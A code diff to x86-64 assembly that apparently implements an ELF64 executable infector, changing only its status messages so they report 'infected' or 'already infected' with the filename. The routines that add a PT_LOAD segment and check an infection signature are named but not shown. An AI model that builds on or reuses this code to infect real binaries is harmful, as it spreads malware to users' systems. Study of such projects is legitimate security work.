@@ -21,9 +21,8 @@ section .data
     newline:          db 10               ; newline character
     msg_valid:        db " is a valid elf64 executable", 10, 0
     msg_invalid:      db " is not a valid elf64 executable", 10, 0
-    msg_add_pt_load:  db "add pt_load", 10, 0
-    msg_infected:     db "infected file", 10, 0
-    msg_not_infected: db "not infected", 10, 0
+    msg_infected:     db "infected ", 0
+    msg_already_infected: db "already infected ", 0
 
 section .text
 global _start
@@ -261,9 +260,16 @@ add_pt_load:
     mov edi, r13d
     syscall
 
-    ; Print success message
-    lea rdi, [rel msg_add_pt_load]
+    ; Print "infected " + filename + newline
+    lea rdi, [rel msg_infected]
     call print_string
+    mov rdi, r12                ; filename
+    call print_string
+    mov eax, SYS_WRITE
+    mov edi, STDOUT
+    lea rsi, [rel newline]
+    mov edx, 1
+    syscall
 
     jmp .add_pt_load_done
 
@@ -399,9 +405,16 @@ check_signature:
     mov edi, r13d
     syscall
 
-    ; Print "infected file"
-    lea rdi, [rel msg_infected]
+    ; Print "already infected " + filename + newline
+    lea rdi, [rel msg_already_infected]
     call print_string
+    mov rdi, r12                ; filename
+    call print_string
+    mov eax, SYS_WRITE
+    mov edi, STDOUT
+    lea rsi, [rel newline]
+    mov edx, 1
+    syscall
     
     ; Return 1 (infected) - save to stack
     mov qword [rbp-8], 1
@@ -414,10 +427,6 @@ check_signature:
     syscall
 
 .check_sig_not_infected:
-    ; Print "not infected"
-    lea rdi, [rel msg_not_infected]
-    call print_string
-    
     ; Return 0 (not infected) - save to stack
     mov qword [rbp-8], 0
 
